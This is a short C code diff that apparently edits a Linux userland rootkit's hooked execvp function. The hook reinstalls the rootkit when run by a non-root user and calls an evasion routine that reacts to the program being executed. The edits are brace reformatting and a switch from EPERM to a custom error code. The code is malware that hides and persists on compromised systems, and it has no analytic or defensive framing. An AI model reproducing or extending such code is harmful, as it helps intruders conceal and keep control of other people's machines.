@@ -1,5 +1,4 @@
-int execvp(const char *filename, char *const argv[])
-{
+int execvp(const char *filename, char *const argv[]){
 #ifdef DO_REINSTALL
     if(!not_user(0)) reinstall();
 #endif
@@ -13,12 +12,11 @@ int execvp(const char *filename, char *const argv[])
 
 #if defined(DO_REINSTALL) && defined(DO_EVASIONS)
     int evasion_status = evade(filename, argv, NULL);
-    switch(evasion_status)
-    {
+    switch(evasion_status){
         case VEVADE_DONE:
             exit(0);
         case VINVALID_PERM:
-            errno = EPERM;
+            errno = CANTEVADE_ERR;
             return -1;
         case VFORK_ERR:
             return -1;
